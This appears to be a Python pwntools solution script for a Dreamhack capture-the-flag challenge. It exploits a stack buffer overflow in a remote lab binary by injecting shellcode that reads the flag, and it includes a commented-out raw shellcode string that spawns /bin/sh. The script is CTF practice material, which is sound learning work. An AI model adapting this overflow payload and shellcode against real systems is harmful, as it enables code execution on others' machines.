from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

#p = process("./basic_exploitation_000")
p = remote("host3.dreamhack.games", "10945")

p.recvuntil(b'buf = (')
buf_addr = int(p.recv(10), 16)
print(hex(buf_addr))


payload = asm(shellcraft.cat('./flag'))
payload += b'A' * (0x84 - len(payload))
payload += p32(buf_addr)

# payload = b'\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x6a\x0e\x58\x83\xe8\x03\x89\xe3\x31\xc9\x31\xd2\xcd\x80\x31\xc0\x89\xc3\x40\xcd\x80'
# payload += b'A' * (0x84 - len(payload))
# payload += p32(buf_addr)


p.sendline(payload)
p.interactive()